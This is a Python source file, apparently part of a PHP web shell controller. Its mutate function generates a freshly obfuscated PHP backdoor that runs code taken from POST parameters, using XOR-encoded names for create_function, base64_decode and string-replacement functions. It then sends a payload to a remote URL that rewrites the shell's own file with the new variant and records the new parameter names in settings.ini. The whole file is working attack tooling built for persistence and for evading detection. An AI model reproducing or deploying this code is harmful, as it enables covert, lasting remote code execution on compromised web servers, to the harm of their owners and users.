import secrets
import modules.send as send
import base64
import random
import configparser
import modules.generate as gen

# ГОВНОКОДИЩЕ ЕБАНОЕ

def mutate(url,uagent):

    x = secrets.token_hex(2)
    if x[0].isdigit(): 
        while x[0].isdigit():x = secrets.token_hex(2)

    # url = 'https://127.0.0.1/index.php'
    # uagent = 'test'

    Zt = secrets.token_urlsafe(4)
    # if Zt[0].isdigit(): 
    #     while Zt[0].isdigit():Zt = secrets.token_urlsafe(4)

    Vt = secrets.token_urlsafe(4)
    # if Vt[0].isdigit(): 
    #     while Vt[0].isdigit():Vt = secrets.token_urlsafe(4)

    config = configparser.ConfigParser()
    config.read('settings.ini')
    Zc = config['SETTINGS']['Z']
    # Vc = config['SETTINGS']['V']

    text = 'create_function'
    chars = secrets.token_urlsafe(2)
    many = random.randint(1,3)
    listOne = chars.join([text[i:i+many] for i in range(0, len(text),many)])

    # what = secrets.token_urlsafe(2)
    # base = 'base64_decode'
    # chars2 = secrets.token_urlsafe(2)
    # listTwo = chars2.join([base[i:i+many] for i in range(0, len(base),many)])
    # fulll = '$'+x+' = str_replace(\''+chars+ '\',\'\',\''+listOne+'\')(\'\',$_POST[\'Z\']);'+'$'+x+'();die();'

    structure = random.randint(1,4)
    match structure:
        case 1: 
            start = 'if(isset($_POST[\''+Zt+'\'])){'
            end2 = '}'
        case 2:
            start = 'do{'
            end2 = 'break;}while(isset($_POST[\''+Zt+'\']));'
        case 3:
            start = 'while(isset($_POST[\''+Zt+'\'])){'
            end2 = 'break;}'
        case 4:
            start = 'for(isset($_POST[\''+Zt+'\']);;){'
            end2 = 'break;}'

    first = random.randint(1,6)
    match first:
        case 1: str1 = '$'+x+' = str_replace(\''+chars+ '\',\'\',\''+listOne+'\')'
        case 2: str1 = '$'+x+' = ("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")(\''+chars+ '\',\'\',\''+listOne+'\')'
        case 3: str1 = '$'+x+' = strtr("'+listOne+'", array("'+chars+ '" =>""))'
        case 4: str1 = '$'+x+' = ("3NBQA"^"7xsKi"^"wBCnZ")("'+listOne+'", array("'+chars+ '" =>""))'
        case 5: str1 = '$'+x+' = preg_replace("/'+chars+'/","","'+listOne+'")'
        case 6: str1 = '$'+x+' = ("HeAcQfTChEyS"^"roGfIBCkNHxy"^"JxcbGVrXJlbO")("/'+chars+'/","","'+listOne+'")'

    basesf = random.randint(1,2)
    match basesf:
        case 1: b64 = '(\'\',base64_decode'
        case 2: b64 = '(\'\',("wBnttPJWhudVy"^"OATvw1TwONBxp"^"ZbIg5UADBXIJl")'

    second = random.randint(1,4)
    match second:
        case 1 : str2 = '(str_replace($_POST[\''+Vt+'\'],\'\',$_POST[\''+Zt+'\'])));'
        case 2 : str2 = '(("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")($_POST[\''+Vt+'\'],\'\',$_POST[\''+Zt+'\'])));'
        case 3 : str2 = '(strtr($_POST[\''+Zt+'\'], array($_POST[\''+Vt+'\'] => \'\'))));'
        case 4 : str2 = '(("3NBQA"^"7xsKi"^"wBCnZ")($_POST[\''+Zt+'\'], array($_POST[\''+Vt+'\'] => \'\'))));'

        # case 1 : str2 = '(str_replace($_POST[\'V\'],\'\',$_POST[\'Z\'])));'
        # case 2 : str2 = '(("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")($_POST[\'V\'],\'\',$_POST[\'Z\'])));'
        # case 3 : str2 = '(strtr($_POST[\'Z\'], array($_POST[\'V\'] => \'\'))));'
        # case 4 : str2 = '(("3NBQA"^"7xsKi"^"wBCnZ")($_POST[\'Z\'], array($_POST[\'V\'] => \'\'))));'

        # case 5 : str2 = '(preg_replace("/".$_REQUEST[\'V\']."/","",$_REQUEST[\'Z\'])));'
        # case 6 : str2 = '(("HeAcQfTChEyS"^"roGfIBCkNHxy"^"JxcbGVrXJlbO")("/".$_REQUEST[\'V\']."/","",$_REQUEST[\'Z\'])));'

    end = '$'+x+'();die();'

    full2 = start+str1+b64+str2+end+end2

    print ("Payload:\n\n"+full2+"\n")

    lel = base64.b64encode(full2.encode())

    data = f'''$what = base64_decode({lel});''' + f'''
    $findme = 'isset($_POST[\\'{Zc}\\'])';''' + '''
    //echo $findme;
    $n = getcwd() . '/' . basename($_SERVER['PHP_SELF']);
    $text= fread(fopen($n, "r"),filesize($n));
    $text = preg_replace(\'/^\s+/\',\'\',htmlentities($text));
    $array  = explode("\\n",$text);
    //echo $n;
    //echo $text;
    //print_r($array);
    $dot = count($array);

    for ($i = 0; ; $i++) { 
        if ($i > $dot) { break; }
        $pos = strpos($array[$i], $findme);
        if($pos !== false){$array[$i]=$what; echo "Found at line ".$i."\\n"; break;}
    }
    //print_r($array);
    $write = implode("\\n", $array );
    $write = html_entity_decode($write);
    //echo $write;
    echo "Mutating...\\n";
    file_put_contents($n, "");
    file_put_contents($n, $write);
    echo "Mutated successfully";
    '''

    x = send.send(url,data,uagent) 
    print(x)

    config['SETTINGS']['Z'] = Zt
    config['SETTINGS']['V'] = Vt
    with open('settings.ini', 'w') as configfile: config.write(configfile)